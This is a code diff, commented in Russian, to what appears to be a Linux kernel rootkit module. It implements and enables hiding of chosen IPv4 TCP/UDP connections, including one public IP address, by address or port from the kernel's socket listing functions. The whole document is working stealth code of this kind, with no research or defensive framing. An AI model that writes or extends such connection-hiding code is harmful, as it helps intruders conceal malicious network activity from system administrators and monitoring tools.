@@ -149,13 +149,18 @@ enum Protocols {
     udp
 };
 
+bool is_hide_addr(__be32 saddr, __be32 daddr, enum Protocols protocol);
+bool is_hide_port(__be16 sport, __be16 dport, enum Protocols protocol);
+bool is_hide_net_info(__be32 saddr, __be32 daddr, __be16 sport, __be16 dport, enum Protocols protocol);
+bool is_skip4_seq_show (void *v, enum Protocols protocol);
+
 struct Extended_array {
     void* array_addr;
     int array_size;
 };
 
 // позже можно будет тип массива на __be32 для адр и __be16 для порт
-char *tcp4_addrs[] = {"192.168.157.153", "0.0.0.0"};
+char *tcp4_addrs[] = {"15.197.130.177", "0.0.0.0"};
 char *udp4_addrs[] = {"192.168.157.254", "0.0.0.0"};
 struct Extended_array addrs[] = {
     {tcp4_addrs, sizeof(tcp4_addrs) / sizeof(tcp4_addrs[0])}, 
@@ -169,19 +174,26 @@ struct Extended_array ports[] = {
     {udp4_ports, sizeof(udp4_ports) / sizeof(udp4_ports[0])}
 };
 
-// bool is_hide_addr(__be32 saddr, __be32 daddr, enum Protocols protocol) {
-//     // надо будет потом добавить проверку на наличие данных в этом массиве
-//     // пока будем думать, что чтото в нем есть
-//     // тут не работает, надо думать над видом хранения айпи адр
-//     int size_proto_addrs = sizeof(addrs[protocol]) / sizeof(addrs[protocol][0]);
-//     for (int ip_id = 0; ip_id < size_proto_addrs; ip_id++) {
-//         if (saddr == addrs[protocol][ip_id] || daddr == addrs[protocol][ip_id]) {
-//             return true;
-//         }    
-//     }
+// in4/6_pton
+// пока реализовано для ipv4
+bool is_hide_addr(__be32 saddr, __be32 daddr, enum Protocols protocol) {
+    // надо будет потом добавить проверку на наличие данных в этом массиве
+    // пока будем думать, что чтото в нем есть
+    __be32 addr;
+    
+    for (int ip_id = 0; ip_id < addrs[protocol].array_size; ip_id++) {
+        if (!in4_pton(((char **)addrs[protocol].array_addr)[ip_id], -1, (u8 *)&addr, '\0', NULL)) {
+            pr_err("Err in4_pton\n");
+            continue;
+        }
 
-//     return false;
-// }
+        if (saddr == addr || daddr == addr) {
+            return true;
+        }    
+    }
+
+    return false;
+}
 
 bool is_hide_port(__be16 sport, __be16 dport, enum Protocols protocol) {
     // надо будет потом добавить проверку на наличие данных в этом массиве
@@ -199,13 +211,14 @@ bool is_hide_port(__be16 sport, __be16 dport, enum Protocols protocol) {
 
 bool is_hide_net_info(__be32 saddr, __be32 daddr, __be16 sport, __be16 dport, enum Protocols protocol) {
     // пока надо подумать над этим
-    if (/*is_hide_addr(saddr, daddr, protocol) ||*/ is_hide_port(sport, dport, protocol)) {
+    if (is_hide_addr(saddr, daddr, protocol) || is_hide_port(sport, dport, protocol)) {
         return true;
     }
     
     return false;
 }
 
+// struct inet_sock - net/inet_sock.h
 bool is_skip4_seq_show (void *v, enum Protocols protocol) {
     if (v != SEQ_START_TOKEN) {
         struct sock *sk = (struct sock *)v;
